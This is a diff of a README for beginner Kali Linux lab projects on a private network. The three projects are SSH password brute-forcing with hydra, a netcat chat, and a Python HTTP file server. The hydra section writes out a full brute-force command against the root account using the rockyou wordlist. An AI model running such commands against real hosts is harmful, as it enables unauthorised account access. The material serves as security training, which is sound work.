@@ -1,113 +1,59 @@
-# Kali-Projects
-# All-in-One Security & Networking Projects
+# Kali Projects
+Project 1: SSH Brute Force with Hydra
+Goal: Use hydra to brute force SSH login.
 
-This repo contains three easy beginner projects for learning basic networking and security concepts without needing internet access.
+How to run
+Make sure hydra is installed on Kali:
 
----
+bash
+Copy
+Edit
+sudo apt update
+sudo apt install hydra -y
+Run the brute force command (replace username, target IP, and wordlist path):
 
-## Project 1: SSH Brute Force with Hydra
-
-**Purpose:** Brute force SSH login passwords using `hydra`.
-
-**Usage:**  
-```bash
-chmod +x hydra_bruteforce.sh
-./hydra_bruteforce.sh <username> <target_ip> <wordlist>
+bash
+Copy
+Edit
+hydra -l <username> -P <path_to_wordlist> ssh://<target_ip>
 Example:
 
 bash
 Copy
 Edit
-./hydra_bruteforce.sh root 192.168.56.10 /usr/share/wordlists/rockyou.txt
-Code: hydra_bruteforce.sh
-
-bash
-Copy
-Edit
-#!/bin/bash
-
-if [ $# -ne 3 ]; then
-  echo "Usage: $0 <username> <target_ip> <wordlist>"
-  exit 1
-fi
-
-USER=$1
-TARGET=$2
-WORDLIST=$3
-
-echo "[*] Starting SSH brute force attack on $TARGET with user $USER"
-hydra -l $USER -P $WORDLIST ssh://$TARGET
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.10
 Project 2: Simple Chat with Netcat
-Purpose: Create a basic chat server and client using netcat.
+Goal: Set up a simple chat server and client with netcat.
 
-Usage:
-
-Start server:
-
-bash
-Copy
-Edit
-./netcat_chat.sh server <port>
-Start client:
+On Ubuntu (server):
+Start listening on a port, e.g., 1234:
 
 bash
 Copy
 Edit
-./netcat_chat.sh client <server_ip> <port>
-Example:
+nc -l -p 1234
+On Kali (client):
+Connect to the server IP and port:
 
 bash
 Copy
 Edit
-# On server machine
-./netcat_chat.sh server 1234
+nc 192.168.56.10 1234
+Now anything you type on client or server side will be sent back and forth.
 
-# On client machine
-./netcat_chat.sh client 192.168.56.10 1234
-Code: netcat_chat.sh
-
-bash
-Copy
-Edit
-#!/bin/bash
-
-if [ "$1" == "server" ]; then
-  PORT=$2
-  echo "[*] Starting netcat chat server on port $PORT..."
-  nc -l -p $PORT
-elif [ "$1" == "client" ]; then
-  SERVER_IP=$2
-  PORT=$3
-  echo "[*] Connecting to chat server $SERVER_IP on port $PORT..."
-  nc $SERVER_IP $PORT
-else
-  echo "Usage: $0 server <port> | client <server_ip> <port>"
-  exit 1
-fi
 Project 3: Minimal Python HTTP Server
-Purpose: Serve current directory files over HTTP on port 8080.
+Goal: Serve files over HTTP from the current directory on Ubuntu.
 
-Usage:
+How to run
+Run the Python built-in HTTP server on port 8080:
 
 bash
 Copy
 Edit
-python3 simple_http_server.py
-Open in browser or use curl:
+python3 -m http.server 8080
+Access from Kali or browser:
 
 cpp
 Copy
 Edit
-http://<server_ip>:8080
-Code: simple_http_server.py
-
-python
-Copy
-Edit
-from http.server import HTTPServer, SimpleHTTPRequestHandler
-
-PORT = 8080
-
-with HTTPServer(('', PORT), SimpleHTTPRequestHandler) as httpd:
-    print(f"Serving HTTP on port {PORT}...")
-    httpd.serve_forever()
+http://192.168.56.10:8080
